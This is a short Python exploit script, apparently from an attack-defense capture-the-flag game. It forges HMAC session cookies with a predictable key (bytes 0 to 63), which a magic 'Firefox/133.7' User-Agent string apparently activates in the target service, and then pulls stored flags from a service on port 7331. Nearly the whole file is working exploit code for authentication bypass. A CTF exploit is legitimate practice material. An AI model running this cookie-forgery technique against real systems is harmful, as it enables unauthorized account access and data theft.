import requests
import hashlib
import hmac
import base64
import random

KEY = bytes(range(64))

def forge_cookie(username):
    return base64.b64encode(hmac.new(KEY, username.encode(), hashlib.sha256 ).digest()+username.encode()).decode()

def exploit_one(target, flag_id):
    """
    Flags stored in array can be retrieved by setting the useragent to contain the string "Firefox/133.7", which
    sets the effective HMAC key to [0,1,2,...,63]
    """
    t = base64.b64decode(requests.get(f"http://{target}:7331/api/array/0", headers={"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/133.7"}, cookies={"Session": forge_cookie(flag_id)}).text)
    print(t)
    print(t[::-1])

def exploit(target, flag_ids):
    flag_ids = ','.join(flag_ids).split(',')
    for flag_id in flag_ids:
        try:
            exploit_one(target, flag_id)
        except Exception as e:
            print(e)
            pass


if __name__ == '__main__':
    import sys
    exploit(sys.argv[1] if len(sys.argv) > 1 else 'localhost', sys.argv[2:])
